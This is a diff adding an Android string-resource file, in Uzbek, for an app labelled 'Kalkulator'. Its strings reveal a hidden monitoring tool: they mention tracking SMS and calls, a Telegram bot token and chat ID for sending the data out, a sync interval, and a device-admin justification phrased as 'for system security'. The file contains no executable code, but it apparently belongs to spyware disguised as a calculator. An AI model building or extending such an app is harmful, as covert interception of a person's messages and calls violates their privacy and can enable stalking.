@@ -1,0 +1,24 @@
+<resources>
+    <string name="app_name">Kalkulator</string>
+    <string name="monitoring_active">Nazorat faol</string>
+    <string name="monitoring_inactive">Nazorat o\'chirilgan</string>
+    <string name="enable_monitoring">Nazoratni yoqish</string>
+    <string name="disable_monitoring">Nazoratni o\'chirish</string>
+    <string name="telegram_bot_token">Telegram Bot Token</string>
+    <string name="telegram_chat_id">Telegram Chat ID</string>
+    <string name="save_settings">Sozlamalarni saqlash</string>
+    <string name="permissions_required">Ruxsatlar kerak</string>
+    <string name="grant_permissions">Iltimos, barcha ruxsatlarni bering</string>
+    <string name="notification_title">Nazorat faol</string>
+    <string name="notification_text">SMS va qo\'ng\'iroqlar kuzatilmoqda</string>
+    <string name="service_running">Xizmat ishlayapti</string>
+    <string name="status">Holat:</string>
+    <string name="last_sync">Oxirgi yuborilgan:</string>
+    <string name="never">Hech qachon</string>
+    <string name="settings_saved">Sozlamalar saqlandi</string>
+    <string name="enter_bot_token">Bot tokenni kiriting</string>
+    <string name="enter_chat_id">Chat ID ni kiriting</string>
+    <string name="sync_interval">Yuborish davriyligi (daqiqa)</string>
+    <string name="admin_description">Tizim xavfsizligi uchun</string>
+</resources>
+
